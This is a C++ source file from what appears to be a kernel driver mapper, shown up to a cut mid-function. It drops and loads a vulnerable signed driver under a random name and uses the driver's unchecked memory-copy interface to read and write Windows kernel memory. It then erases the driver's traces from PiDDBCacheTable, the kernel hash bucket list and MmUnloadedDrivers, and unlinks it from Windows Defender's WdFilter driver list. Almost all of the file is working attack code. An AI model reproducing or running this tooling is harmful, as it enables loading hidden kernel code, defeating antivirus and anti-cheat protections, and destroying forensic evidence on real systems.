/*
 * The vulnerable provider and every kernel access built on top of it.
 *
 * Everything here runs against kernel memory through a memcpy IOCTL that does
 * not validate the addresses it is given, so the rule for this file is that no
 * pointer is ever written to, and no struct field is ever read or modified,
 * before its offset has been either resolved from the running build's PDB or
 * verified by matching the expected content at that address.
 *
 * The riskiest code in the project is the NtAddAtom hook in Driver.hpp and the
 * PTE self-map further down: both patch kernel code, and a wrong address there
 * is an immediate bugcheck rather than a clean failure. Those two paths are
 * deliberately defensive - they verify before they write and abort the run
 * rather than continue on a guess.
 */

#include "Driver.hpp"

#include <Windows.h>
#include <string>
#include <fstream>
#include <filesystem>
#include <memory>
#include <random>
#include <sstream>
#include <vector>
#include <iostream> //Log() writes through std::wcout at the point of use

#include "Provider.hpp"
#include "Resource.hpp"
#include "../Utilities/Utilities.hpp"
#include "../Utilities/Console.hpp"
#include "../Service/Service.hpp"
#include "../App/NT.hpp"
#include "../PE/PE.hpp"
#include "../Symbols/Handler/SymbolsHandler.hpp"

//Kernel page table self-mapping helpers are defined further down the file.
static bool ProbePteSelfMapBase();
static bool ResolveMmPteBase();

//Device handle to the provider. Invalid when the provider is not loaded.
HANDLE Driver::hDevice = 0;

//Base of ntoskrnl.exe, the module every kernel address below is relative to.
ULONG64 Driver::ntoskrnlAddr = 0;

//Structure field offsets for the running build, filled from Offsets.ini.
DriverOffsets Driver::g_offsets = {};

//True only when this process registered and loaded the provider. When the
//provider was already running (vendor software loaded it), nothing was
//created and nothing is torn down.
static bool g_driverWasLoadedByUs = false;

//Set by --no-forensics: skip the kernel structure walks, which are the parts
//that modify existing kernel state.
bool Driver::g_skipForensicCleanup = false;

/*
 * Statuses Load returns for each forensic stage.
 *
 * These used to be written as "STATUS_DELETE_PENDING | 0x1000" and friends at
 * each call site, which is three problems at once: the intent is only in the
 * literal, the same base code is repeated four times, and nothing records that
 * the OR-ed value is an application-defined status rather than a documented one.
 *
 * They are application-defined and deliberately so. Microsoft reserves
 * 0xC0000000-0xC0000FFF for system statuses, so a status in the 0xC000_1000
 * range can be recognised as "this is the mapper telling you which stage
 * failed" and cannot collide with a system code the OS might return instead.
 * Only NT_SUCCESS() is ever tested against them - the caller either aborts or
 * does not - so the exact value is a diagnostic, not a contract.
 */
#define AMEGER_STAGE_STATUS(n) (static_cast<NTSTATUS>(0xC0001000u + (n)))

//Random name for the dropped provider and its service, generated once per run
//so the same name is used consistently for load, match and cleanup.
static std::string cachedDriverName = "";

/*
 * Kernel address probing.
 *
 * The provider memcpy's whatever address it is handed and does not validate it,
 * so a read or write to an unmapped kernel address faults inside the provider:
 * bugcheck 0x50, not a clean false. Range-checking a pointer is necessary but not
 * sufficient here - everything at or above 0xFFFF000000000000 passes it, and the
 * great majority of it is not mapped.
 *
 * MmIsAddressValid runs in the kernel and never faults, so calling it through the
 * provider converts "this address is not mapped" from a bugcheck into a refusal.
 * It is called before every dereference of a pointer this file did not resolve
 * itself.
 *
 * These live at the top of the file rather than beside the WdFilter walk that
 * introduced them, because they are not WdFilter-specific: the hash bucket walk
 * and the PiDDB unlink dereference kernel pointers of the same kind, and a probe
 * that only one caller could reach is a probe the next caller will not use.
 */

//True when value lies in the kernel half of the address space. A structure
//field that is supposed to hold a kernel pointer but does not mean the layout
//does not match this build; dereferencing it through the provider would fault
//inside the provider (a bugcheck, not a clean failure), so callers refuse
//instead of following it.
static bool IsKernelAddress(uint64_t value) {
	return value >= 0xFFFF000000000000ULL;
}

//Safe probe before handing an address to the provider. Returns false for a
//non-kernel address without calling into the kernel at all.
static bool ProbeKernelAddressMapped(uint64_t address) {
	if (!IsKernelAddress(address))
		return false;

	static uint64_t kernel_MmIsAddressValid = 0;
	//Retry-on-zero, not a one-shot "attempted" flag: a first call made before
	//ntoskrnlAddr was resolved used to cache the failure permanently and every
	//later probe silently fell back to the range check alone.
	if (!kernel_MmIsAddressValid) {
		kernel_MmIsAddressValid = Driver::GetKernelModuleExport(Driver::ntoskrnlAddr, "MmIsAddressValid");
	}
	//No probe available: fall back to the range check alone. The caller still has
	//its iteration cap and kernel-range checks, so this is strictly better than
	//the unchecked read it replaced.
	if (!kernel_MmIsAddressValid)
		return true;

	BOOLEAN valid = FALSE;
	if (!Driver::CallKernelFunction(&valid, kernel_MmIsAddressValid, (PVOID)address))
		return false;
	return valid != FALSE;
}

//Probe a span rather than a single address. Used where a loop is about to read a
//whole array: probing each element costs one kernel round trip per slot, and the
//arrays involved are each a single allocation, so the two ends imply the middle.
static bool ProbeKernelRangeMapped(uint64_t address, uint64_t size) {
	//Bounded so a file controlled length cannot become an "ends of a 4 GB range"
	//argument that is meaningless as a proof. The largest caller below is a
	//32768 entry array.
	if (size == 0 || size > 0x10000)
		return false;
	if (!IsKernelAddress(address))
		return false;

	const uint64_t last = address + size - 1;
	if (last < address)
		return false;
	if (!IsKernelAddress(last))
		return false;

	if (!ProbeKernelAddressMapped(address))
		return false;
	if (!ProbeKernelAddressMapped(last))
		return false;
	return true;
}

/*
 * The process-wide PRNG, seeded once from std::random_device.
 *
 * Replaces srand(time(NULL) * GetCurrentThreadId()) + rand(). That seed is
 * guessable - two runs started in the same second on the same thread id
 * collide - and rand() is a low quality LCG whose output is predictable from a
 * few samples. Both consumers want bytes an observer cannot anticipate: the
 * provider name is matched against kernel structures during cleanup, and the
 * file overwrite is forensic.
 *
 * Seeded lazily on first use so there is no separate init step to forget, and
 * shared by every consumer so the name and the wipe draw from one stream.
 */
static std::mt19937_64& RandomEngine() {
	static std::mt19937_64 engine{ std::random_device{}() };
	return engine;
}

/*
 * Random alphanumeric name for the dropped provider and its service.
 *
 * Generated once per run and cached, because the same name has to be used for
 * the file, the service key, the PiDDB entry and the hash bucket entry: they
 * are matched against each other during cleanup.
 *
 * The shape is unchanged from the rand() version: 10..29 characters drawn from
 * the 52 letters in alphanum, so every forensic matcher downstream still sees
 * the same format.
 */
std::wstring Driver::GetDriverNameW() {
	if (cachedDriverName.empty()) {
		//Create a random name
		char buffer[100]{};
		static const char alphanum[] =
			"abcdefghijklmnopqrstuvwxyz"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		auto& engine = RandomEngine();
		std::uniform_int_distribution<int> length_dist(10, 29);
		std::uniform_int_distribution<size_t> char_dist(0, sizeof(alphanum) - 2);
		int len = length_dist(engine);
		for (int i = 0; i < len; ++i)
			buffer[i] = alphanum[char_dist(engine)];
		cachedDriverName = buffer;
	}

	std::wstring name(cachedDriverName.begin(), cachedDriverName.end());
	return name;
}

//Full path of the dropped provider: %TEMP%\<generated name>.
std::wstring Driver::GetDriverPath() {
	std::wstring temp = Utilities::GetFullTempPath();
	if (temp.empty()) {
		return L"";
	}
	return temp + L"\\" + GetDriverNameW();
}

/*
 * Is the provider already loaded?
 *
 * Opens the device with FILE_ANY_ACCESS and closes it again. This is what lets
 * the mapper reuse a provider that vendor software loaded itself: if it is
 * already there, no service key and no file are created, so there is nothing to
 * clean up afterwards.
 */
bool Driver::IsRunning() {
	const HANDLE file_handle = CreateFileW(Provider::kDeviceName, FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
	if (file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE)
	{
		CloseHandle(file_handle);
		return true;
	}
	return false;
}

//get Se debug privilege
//Required to open kernel handles and to read kernel memory through them.
NTSTATUS Driver::AcquireDebugPrivilege() {

	ULONG SE_DEBUG_PRIVILEGE = 20UL;
	BOOLEAN SeDebugWasEnabled = FALSE;
	//RtlAdjustPrivilege is a direct import from ntdll, so there is nothing to
	//look up first. This used to be preceded by a GetModuleHandleA("ntdll.dll")
	//whose result was discarded by the calls below, which read as though the
	//lookup mattered; it cannot fail for a process that is running.
	NTSTATUS Status = Nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &SeDebugWasEnabled);
	if (!NT_SUCCESS(Status)) {
		Log("[-] Failed to acquire SE_DEBUG_PRIVILEGE" << std::endl);
	}
	return Status;
}

/*
 * Load the provider and prepare everything the mapper needs from it.
 *
 * Order matters here:
 *   1. reuse an already loaded provider, or drop and register one
 *   2. open the device - the only point at which kernel access is possible
 *   3. resolve ntoskrnl and verify it is mapped
 *   4. replace structure offsets with the running build's own
 *   5. verify the PTE self-map, before anything can be mapped
 *   6. remove the provider's traces, unless --no-forensics
 *
 * Any failure calls Unload(), so a partially loaded run leaves nothing behind.
 */
NTSTATUS Driver::Load() {
	Log(L"[!] Using vulnerable driver provider: " << Val(Provider::kShortName) << L", Device: " << Val(Provider::kDeviceName) << std::endl);

	/*
	 * SeDebugPrivilege, acquired before either branch below.
	 *
	 * This was inside the "provider is not running" branch, because that branch
	 * needs it to register a service. That comment was wrong, and the code was
	 * wrong with it: SystemModuleInformation returns an ImageBase of 0 for every
	 * single module to a process that does not hold SeDebugPrivilege. Verified on
	 * a run of this machine - 289 modules, 289 with an ImageBase of zero, and the
	 * same query after RtlAdjustPrivilege returning 289 populated ones and
	 * ntoskrnl.exe at a real address.
	 *
	 * So the moment a provider was already loaded - vendor software, or simply a
	 * second run after the first could not unload it - Load skipped the privilege,
	 * found no kernel modules at all, and aborted at
	 * "[-] Failed to get ntoskrnl.exe". The reuse path described below could
	 * never work: it failed before reaching any of the work it exists to do.
	 */
	const auto debug_privilege = AcquireDebugPrivilege();
	if (!NT_SUCCESS(debug_privilege)) {
		Log(L"[-] Failed to acquire SeDebugPrivilege" << std::endl);
		Driver::Unload();
		return debug_privilege;
	}

	//If the provider driver is already running on the system (vendor software
	//loaded it) we just reuse the existing device. No service registration,
	//no file drop, nothing to clean up afterwards.
	if (Driver::IsRunning()) {
		Log(L"[+] Provider driver is already loaded, reusing the existing instance (no artifacts will be created)" << std::endl);
	}
	else {
		Log(L"[!] Provider driver not running, loading it, Name: " << Val(GetDriverNameW()) << std::endl);

		std::wstring driver_path = GetDriverPath();
		if (driver_path.empty()) {
			Log(L"[-] Can't find TEMP folder" << std::endl);
			return STATUS_UNSUCCESSFUL;
		}

		_wremove(driver_path.c_str());

		if (!Utilities::CreateFileFromMemory(driver_path, reinterpret_cast<const char*>(Resource::driver), sizeof(Resource::driver))) {
			Log(L"[-] Failed to create vulnerable driver file" << std::endl);
			return STATUS_DISK_OPERATION_FAILED;
		}

		//Separates the provider setup from the load result that follows.
		LogBlank();
		auto status = Service::RegisterAndStart(driver_path, GetDriverNameW());
		if (!NT_SUCCESS(status)) {
			Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
			_wremove(driver_path.c_str());
			return status;
		}

		g_driverWasLoadedByUs = true;
	}

	hDevice = CreateFileW(Provider::kDeviceName, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		Log(L"[-] Failed to open the vulnerable driver device (" << Val(Provider::kShortName) << L")" << std::endl);
		Log(L"[-] Note: the embedded driver resource (Resource.hpp) must contain the .sys binary of the selected provider." << std::endl);
		Driver::Unload();
		return STATUS_NOT_FOUND;
	}

	ntoskrnlAddr = Utilities::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
		Driver::Unload();
		return STATUS_BAD_DLL_ENTRYPOINT;
	}

	//check MZ ntoskrnl.exe
	IMAGE_DOS_HEADER dosHeader = { 0 };
	if (!Driver::ReadMemory(Driver::ntoskrnlAddr, &dosHeader, sizeof(IMAGE_DOS_HEADER)) || dosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
		Log(L"[-] Can't exploit the vulnerable driver, is there any antivirus or anticheat running?" << std::endl);
		Driver::Unload();
		return STATUS_INVALID_IMAGE_FORMAT;
	}

	//Replace every structural offset we can with the real one for this build.
	Driver::g_offsets.LoadFromSymbols();
	if (Driver::g_offsets.ResolvedFromSymbols)
		Log(L"[+] Structure offsets resolved from symbols for this build (" << Val(Driver::g_offsets.ResolvedFieldCount)
			<< L"/" << Val(DriverOffsets::kResolvableFieldCount) << L")" << std::endl);
	else
		Log(L"[!] Structure offsets partially resolved: " << Val(Driver::g_offsets.ResolvedFieldCount)
			<< L"/" << Val(DriverOffsets::kResolvableFieldCount)
			<< L" came from symbols, the rest are using compiled defaults (unresolved fields are validated at runtime)" << std::endl);
	LogBlank();

	//Two steps, deliberately separate. ResolveMmPteBase reads the symbol, and
	//ProbePteSelfMapBase chooses the base that is actually verified to index the
	//pages that matter - the two are not the same value on every build.
	if (!ResolveMmPteBase()) {
		Log(L"[-] nt!MmPteBase could not be read" << std::endl);
		Driver::Unload();
		return STATUS_ACCESS_DENIED;
	}

	//The kernel page tables must be reachable before any read-only page write is
	//attempted, so probe them here and fail before the mapper starts instead of
	//half way through.
	if (!ProbePteSelfMapBase()) {
		Log(L"[-] Aborting: the read-only page write primitive is not available" << std::endl);
		Driver::Unload();
		return STATUS_ACCESS_DENIED;
	}

	//When the provider was reused instead of being loaded by us, it is running
	//under a name we did not generate. GetDriverNameW() produces a fresh random
	//name every run, but the kernel entry we need to clear holds the name the
	//previous run or the vendor registered — a string this run's name can never
	//match. Every cleanup stage below looks for entries by name, so in reuse
	//mode they would all miss and fatal-abort. There is nothing of this run to
	//clean, so the walks are skipped entirely.
	//
	//(The old version of this comment also claimed SeDebugPrivilege was
	//unnecessary in reuse mode. It was wrong - see the call at the top of Load.)
	LogBlank();
	if (!g_driverWasLoadedByUs) {
		Log(L"[*] Provider reused from a prior load, forensic cleanup skipped (provider name differs from this run)" << std::endl);
		return STATUS_SUCCESS;
	}

	if (g_skipForensicCleanup) {
		Log(L"[*] Forensic cleanup skipped (--no-forensics), fewer kernel writes are performed" << std::endl);
		return STATUS_SUCCESS;
	}

	Log(L"[!] Stage = 1/4 | ClearPiDDBCacheTable" << std::endl);
	if (!Driver::ClearPiDDBCacheTable()) {
		Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
		Driver::Unload();
		return AMEGER_STAGE_STATUS(1);
	}
	LogBlank();

	Log(L"[!] Stage = 2/4 | ClearKernelHashBucketList" << std::endl);
	if (!Driver::ClearKernelHashBucketList()) {
		Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
		Driver::Unload();
		return AMEGER_STAGE_STATUS(2);
	}
	LogBlank();

	Log(L"[!] Stage = 3/4 | ClearMmUnloadedDrivers" << std::endl);
	LogBlank();
	if (!Driver::ClearMmUnloadedDrivers()) {
		Log(L"[-] Failed to ClearMmUnloadedDrivers" << std::endl);
		Driver::Unload();
		return AMEGER_STAGE_STATUS(3);
	}
	LogBlank();

	Log(L"[!] Stage = 4/4 | ClearWdFilterDriverList" << std::endl);
	LogBlank();
	if (!Driver::ClearWdFilterDriverList()) {
		Log("[-] Failed to ClearWdFilterDriverList" << std::endl);
		Driver::Unload();
		return AMEGER_STAGE_STATUS(4);
	}

	return STATUS_SUCCESS;
}

/*
 * Upper bound on the entries of WdFilter's runtime driver array.
 *
 * The old code walked a hardcoded 256 slots regardless of the count it had just
 * read. On a build whose array can hold more than that, an entry beyond slot
 * 255 was never found, the walk fell through to "not in list", and the provider
 * was left registered with Defender. The loop now uses the count the structure
 * itself reports, capped here so a garbage count cannot become an unbounded
 * scan of WdFilter's data.
 */
static constexpr ULONG kMaxWdFilterRuntimeDrivers = 4096;

/*
 * Does the LIST_ENTRY at block_base + candidate_offset self verify?
 *
 * This is the property the list head is located by, and it is exact rather than
 * statistical:
 *
 *   - an empty list has both links pointing back at the head field itself
 *   - a non empty list has its first entry's Blink and its last entry's Flink
 *     both pointing back at the head field
 *
 * Nothing that is not a list head can satisfy the second case, because it
 * requires two independent objects to agree on the address of this field.
 *
 * Returns the offset when it verifies and 0 when it does not. A read failure is
 * also 0: the candidate is simply not usable.
 */
static uint32_t VerifyWdFilterListHead(uint64_t block_base, uint32_t candidate_offset) {
	LIST_ENTRY head = { 0, 0 };
	if (!Driver::ReadMemory(block_base + candidate_offset, &head, sizeof(head)))
		return 0;

	//Both links of a list head are kernel pointers. An uninitialised field, or
	//one that lands on something other than a list, yields zero here.
	const uint64_t self = block_base + candidate_offset;
	if (!IsKernelAddress(reinterpret_cast<uint64_t>(head.Flink)) ||
		!IsKernelAddress(reinterpret_cast<uint64_t>(head.Blink)))
		return 0;

	//Empty list: both links point at the head itself.
	if (head.Flink == head.Blink && reinterpret_cast<uint64_t>(head.Flink) == self)
		return candidate_offset;

	/*
	 * Non empty list: the first and last entries must point back at the head.
	 *
	 * These two reads are the first ones this walk makes at an address it has
	 * not resolved, and they are reached for every pointer aligned candidate
	 * offset in the block - so they are the reads most likely to be handed an
	 * unmapped address by a candidate that merely looked plausible. The kernel
	 * range test admits every unmapped kernel address and the provider does not
	 * validate, so the pair is probed before it is read rather than after.
	 */
	if (!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(head.Flink), sizeof(LIST_ENTRY)) ||
		!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(head.Blink), sizeof(LIST_ENTRY)))
		return 0;

	LIST_ENTRY first = { 0, 0 };
	LIST_ENTRY last = { 0, 0 };
	if (!Driver::ReadMemory(reinterpret_cast<uint64_t>(head.Flink), &first, sizeof(first)) ||
		!Driver::ReadMemory(reinterpret_cast<uint64_t>(head.Blink), &last, sizeof(last)))
		return 0;

	if (reinterpret_cast<uint64_t>(first.Blink) != self ||
		reinterpret_cast<uint64_t>(last.Flink) != self)
		return 0;

	return candidate_offset;
}

/*
 * Does the count at count_offset describe the array at array_offset?
 *
 * The count has to be a small positive number and the array a kernel pointer,
 * which on its own is what the old checks tested and what a wrong offset could
 * pass by luck. What makes this a verification rather than a guess is that the
 * entries the count claims exist are then read and have to be kernel pointers
 * too (or the zero an unused slot holds), so a misaligned pair of fields is
 * caught by the contents rather than by their shape.
 *
 * The number of entries checked is capped: it is the count's own claim, not a
 * window of the array, so a large count on a correct pair is verified fully
 * enough without turning a wrong pair into a long scan.
 */
static bool WdFilterCountAndArrayAgree(uint64_t block_base, uint32_t count_offset, uint32_t array_offset) {
	ULONG count = 0;
	uint64_t array = 0;

	if (!Driver::ReadMemory(block_base + count_offset, &count, sizeof(count)) ||
		!Driver::ReadMemory(block_base + array_offset, &array, sizeof(array)))
		return false;

	if (count == 0 || count > kMaxWdFilterRuntimeDrivers)
		return false;

	if (!IsKernelAddress(array))
		return false;

	const ULONG to_check = count < 64 ? count : 64;

	/*
	 * The whole window that is about to be read, probed once before any of it is
	 * touched.
	 *
	 * This loop runs for every (count_offset, array_offset) candidate pair in the
	 * block, and `array` is a value read out of that block - so a pair that
	 * merely looked plausible turned up to 64 reads at whatever it happened to
	 * point at. The end-point probe covers the span, because the array is a
	 * single contiguous allocation.
	 */
	if (!ProbeKernelRangeMapped(array, static_cast<uint64_t>(to_check) * sizeof(uint64_t)))
		return false;

	for (ULONG i = 0; i < to_check; ++i) {
		uint64_t entry = 0;
		if (!Driver::ReadMemory(array + static_cast<uint64_t>(i) * sizeof(uint64_t), &entry, sizeof(entry)))
			return false;

		//Zero is what an unused slot holds; anything else must be a pointer.
		if (entry != 0 && !IsKernelAddress(entry))
			return false;
	}

	return true;
}

/*
 * Locate the count, array and list head of WdFilter's runtime driver block.
 *
 * The window scanned is bounded and pointer aligned, and every read in it is
 * inside WdFilter's .data, so a build whose members sit outside it simply does
 * not resolve instead of being misread.
 *
 * The list head is found first, because its self referential property makes it
 * the only one of the three that can be proved exactly. The count and the array
 * are then searched for among the remaining offsets, restricted to the small
 * set of relative placements the field pair can take - adjacent, or the array
 * eight bytes past the count, which is what every observed build uses. Without
 * that restriction the pair search would test every combination in the window,
 * which is thousands of candidate pairs on a block that is full of small
 * integers and kernel pointers.
 *
 * Returns false when no consistent triple exists, so the caller refuses rather
 * than guessing. A wrong triple is not a misread that this can produce: the
 * head has to self verify and the pair has to describe each other.
 */
static bool FindWdFilterRuntimeDriverBlock(uint64_t block_base,
	uint32_t& out_count_offset, uint32_t& out_array_offset, uint32_t& out_list_offset) {
	constexpr uint32_t kScanWindow = 0x200;
	//Relative placements of the array field from the count field that are tried.
	constexpr int kRelativeArrayOffsets[] = { 4, 8 };

	//The list head: pointer aligned, self verifying, found first.
	uint32_t list_head = 0;
	for (uint32_t offset = 0; offset < kScanWindow; offset += sizeof(void*)) {
		if (VerifyWdFilterListHead(block_base, offset)) {
			list_head = offset;
			break;
		}
	}

	if (!list_head)
		return false;

	for (uint32_t count_offset = 0; count_offset < kScanWindow; count_offset += sizeof(ULONG)) {
		if (count_offset == list_head)
			continue;

		for (const int relative : kRelativeArrayOffsets) {
			const int candidate_static = static_cast<int>(count_offset) + relative;
			if (candidate_static < 0)
				continue;

			const uint32_t array_offset = static_cast<uint32_t>(candidate_static);
			if (array_offset == count_offset || array_offset == list_head || array_offset >= kScanWindow)
				continue;

			if (!WdFilterCountAndArrayAgree(block_base, count_offset, array_offset))
				continue;

			out_count_offset = count_offset;
			out_array_offset = array_offset;
			out_list_offset = list_head;
			return true;
		}
	}

	return false;
}

/*
 * WdFilter per-entry helpers.
 *
 * The runtime driver entry that holds the LIST_ENTRY is not a public UDT, so
 * neither the name field nor the array-base delta nor the driver-info delta
 * can come from the PDB. All three are derived by content below; the previous
 * code hardcoded Entry-0x10, Entry-0x20 and HashBucketEntry_DriverName (0x8,
 * which is ci.dll's HashBucketEntry.DriverName, not a WdFilter offset).
 */

static constexpr USHORT kWdFilterDriverInfoMagic = 0xDA18;

//Window around a list entry inside which the entry's own UNICODE_STRING and
//its driver-info magic must be found. 0x10/0x20 are inside it on every
//observed build; anything outside it is not the same object.
static constexpr int32_t kWdFilterEntryScanRadius = 0x80;
//Same bound for Entry - array_base. The array holds bases, the list holds
//entries inside those bases, so a base belonging to Entry must be at or just
//before Entry.
static constexpr uint64_t kWdFilterMaxBaseDelta = 0x80;

//The range checks and the MmIsAddressValid probe are not WdFilter-specific and
//live at the top of this file as IsKernelAddress / ProbeKernelAddressMapped /
//ProbeKernelRangeMapped. See the comment there for why they are shared.

//Filename-boundary suffix match, case insensitive. The stored name is the full
//path the kernel hashed, so equality never holds and a plain substring lets
//any entry whose path merely contains our random name match. Requiring the
//candidate to END with our name at a filename boundary keeps the intended full
//path match while rejecting "contains anywhere".
static bool WdFilterFileNameMatches(const std::wstring& candidate, const std::wstring& driver_name) {
	if (driver_name.empty() || candidate.size() < driver_name.size())
		return false;
	const size_t off = candidate.size() - driver_name.size();
	for (size_t i = 0; i < driver_name.size(); ++i) {
		if (towlower(candidate[off + i]) != towlower(driver_name[i]))
			return false;
	}
	if (off > 0) {
		const wchar_t prev = candidate[off - 1];
		if (prev != L'\\' && prev != L'/' && prev != L':')
			return false;
	}
	return true;
}

//Locate the UNICODE_STRING inside Entry's own object by content. Scans
//Entry-radius..Entry+radius pointer-aligned and returns the first field whose
//buffer ends with this run's driver name. A match is its own proof, so the
//offset is trusted afterwards; a miss means this entry is not ours.
static bool WdFilterFindNameInEntry(uintptr_t entry, const std::wstring& driver_name,
	uint32_t& out_offset, UNICODE_STRING& out_str, std::wstring& out_name) {
	for (int32_t off = -kWdFilterEntryScanRadius; off <= kWdFilterEntryScanRadius; off += (int32_t)sizeof(void*)) {
		uint64_t field_addr = 0;
		if (off < 0) {
			const uint64_t back = static_cast<uint64_t>(-(int64_t)off);
			if (entry < back)
				continue;
			field_addr = entry - back;
		}
		else {
			field_addr = entry + static_cast<uint64_t>(off);
			if (field_addr < entry)
				continue;
		}
		if (!ProbeKernelRangeMapped(field_addr, sizeof(UNICODE_STRING)))
			continue;
		UNICODE_STRING cand = { 0 };
		if (!Driver::ReadMemory(field_addr, &cand, sizeof(cand)))
			continue;
		if (cand.Length == 0 || cand.Length > 1024 ||
			(cand.Length % sizeof(wchar_t)) != 0 ||
			cand.MaximumLength < cand.Length)
			continue;
		if (!IsKernelAddress(reinterpret_cast<uint64_t>(cand.Buffer)))
			continue;
		if (!ProbeKernelRangeMapped(reinterpret_cast<uint64_t>(cand.Buffer), cand.Length))
			continue;
		auto buf = std::make_unique<wchar_t[]>(static_cast<size_t>(cand.Length) / sizeof(wchar_t) + 1);
		if (!Driver::ReadMemory(reinterpret_cast<uint64_t>(cand.Buffer), buf.get(), cand.Length))
			continue;
		std::wstring value(buf.get(), static_cast<size_t>(cand.Length) / sizeof(wchar_t));
		//Drop a single trailing NUL if the stored length counted it; the
		//suffix match below must see the filename, not the terminator.
		while (!value.empty() && value.back() == L'\0')
			value.pop_back();
		if (!WdFilterFileNameMatches(value, driver_name))
			continue;
		out_offset = static_cast<uint32_t>(off);
		out_str = cand;
		out_name = value;
		return true;
	}
	return false;
}

//Locate the driver-info header by its magic, uniquely. Scans entry-radius..
//entry for 0xDA18 and requires exactly one hit: zero means this build does
//not use the magic here, several means the value occurs by chance and cannot
//identify the header. Either way the free is skipped without writing.
static bool WdFilterFindDriverInfo(uintptr_t entry, uintptr_t& out_info) {
	uintptr_t found = 0;
	uint32_t hits = 0;
	for (int32_t off = -kWdFilterEntryScanRadius; off < 0; off += (int32_t)sizeof(USHORT)) {
		const uint64_t back = static_cast<uint64_t>(-(int64_t)off);
		if (entry < back)
			continue;
		const uint64_t addr = entry - back;
		if (!ProbeKernelRangeMapped(addr, sizeof(USHORT)))
			continue;
		USHORT magic = 0;
		if (!Driver::ReadMemory(addr, &magic, sizeof(magic)))
			continue;
		if (magic != kWdFilterDriverInfoMagic)
			continue;
		found = addr;
		if (++hits > 1)
			return false;
	}
	if (hits != 1)
		return false;
	out_info = found;
	return true;
}

/*
 * Remove the provider from the WdFilter runtime driver list.
 *
 * The field offsets of the runtime driver block are located by content rather
 * than hardcoded, because the structure is not a public UDT and its layout
 * changes between WdFilter builds; see FindWdFilterRuntimeDriverBlock. The
 * per-entry offsets are located the same way: the name UNICODE_STRING is
 * found by scanning for a buffer that ends with this run's driver name at a
 * filename boundary (never via ci.dll's HashBucketEntry_DriverName), the
 * driver-info header by requiring its 0xDA18 magic exactly once in the
 * entry's neighbourhood, and the array base as the unique array value within
 * a small delta before the entry with info < base <= entry. No write happens
 * until all three agree.
 *
 * Ordering is transactional: list unlink first (checked), then array stamp
 * (re-validated, checked, rollback on failure), then count decrement
 * (checked read and write, no fabricated zero), then MpFreeDriverInfoEx on
 * the proven header. Pre-write failures skip (true, WdFilter is optional);
 * only failures after the first write are fatal. --no-forensics skips this
 * function entirely.
 *
 * Returns true when WdFilter is not loaded, not understood, or simply does
 * not contain this provider (nothing to remove) and when the entry was
 * removed. Returns false only when a partial write may have occurred.
 */
bool Driver::ClearWdFilterDriverList() {

	auto WdFilter = Utilities::GetKernelModuleAddress("WdFilter.sys");
	if (!WdFilter) {
		Log("[INFO] WdFilter.sys = NotLoaded | ClearSkipped = OK" << std::endl);
		return true;
	}

	uintptr_t MpBmDocOpenRules = SymbolsHandler::GetInstance()->GetOffset(L"MpBmDocOpenRules");
	if (!MpBmDocOpenRules)
	{
		//The offsets come from WdFilter's PDB, which is not always published.
		//Treat a missing offset like the module not being loaded: skip the
		//cleanup rather than failing the whole mapping over an optional module.
		Log("[INFO] WdFilter offsets unavailable, clear skipped" << std::endl);
		return true;
	}
	MpBmDocOpenRules += WdFilter;

	/*
	 * Locate the three fields of the runtime driver block by content.
	 *
	 * MpBmDocOpenRules is a public symbol, but the structure it points into is
	 * not a public UDT, so its member offsets cannot come from the PDB. They
	 * used to be three hardcoded constants, which is a value that is right for
	 * exactly one WdFilter build and wrong for every other one: it still
	 * produced plausible values often enough that the old "does this look
	 * right" checks could not tell, and the failure was a read from an arbitrary
	 * offset inside WdFilter's data.
	 *
	 * The offsets are derived here from two properties that hold for the
	 * structure whatever its layout, so a build that moves the members is found
	 * rather than silently misread. Every read in the discovery stays inside
	 * WdFilter's own .data, which is mapped in full for a loaded image, so a
	 * candidate that does not verify costs one read and nothing else.
	 */
	uint32_t runtime_count_offset = 0;
	uint32_t runtime_array_offset = 0;
	uint32_t runtime_list_offset = 0;

	if (!FindWdFilterRuntimeDriverBlock(MpBmDocOpenRules, runtime_count_offset, runtime_array_offset, runtime_list_offset)) {
		//WdFilter is an optional module: an unrecognised layout means there is
		//nothing this build understands well enough to modify, so skip the
		//cleanup rather than failing the whole mapping over it. This matches
		//how a missing module or missing offsets are treated above.
		Log("[INFO] WdFilter runtime driver block layout not understood on this build, clear skipped (no kernel write attempted)" << std::endl);
		return true;
	}

	const uintptr_t RuntimeDriversList_Head = MpBmDocOpenRules + runtime_list_offset;
	const uintptr_t RuntimeDriversCount = MpBmDocOpenRules + runtime_count_offset;
	uintptr_t RuntimeDriversArray = MpBmDocOpenRules + runtime_array_offset;

	Log(L"[+] WdFilter runtime driver block located at count " << Val(Hex(runtime_count_offset))
		<< L", array " << Val(Hex(runtime_array_offset))
		<< L", list head " << Val(Hex(runtime_list_offset)) << std::endl);

	ULONG list_count = 0;
	uintptr_t list_array = 0;
	LIST_ENTRY list_head = { 0, 0 };

	//Nothing has been written at this point, so every validation failure below
	//skips the cleanup (true) rather than failing the mapping (false).
	//WdFilter is optional: leaving its list intact is safe, corrupting it is
	//not. Only failures after the first write are fatal.
	if (!ReadMemory(RuntimeDriversCount, &list_count, sizeof(list_count)) ||
		!ReadMemory(RuntimeDriversArray, &list_array, sizeof(list_array)) ||
		!ReadMemory(RuntimeDriversList_Head, &list_head, sizeof(list_head))) {
		Log(L"[INFO] Could not read the WdFilter runtime driver structure, clear skipped" << std::endl);
		return true;
	}

	if (list_count > kMaxWdFilterRuntimeDrivers) {
		Log(L"[INFO] WdFilter runtime driver count " << Val(list_count)
			<< L" is implausible, clear skipped" << std::endl);
		return true;
	}

	if (list_array < 0xFFFF000000000000ULL) {
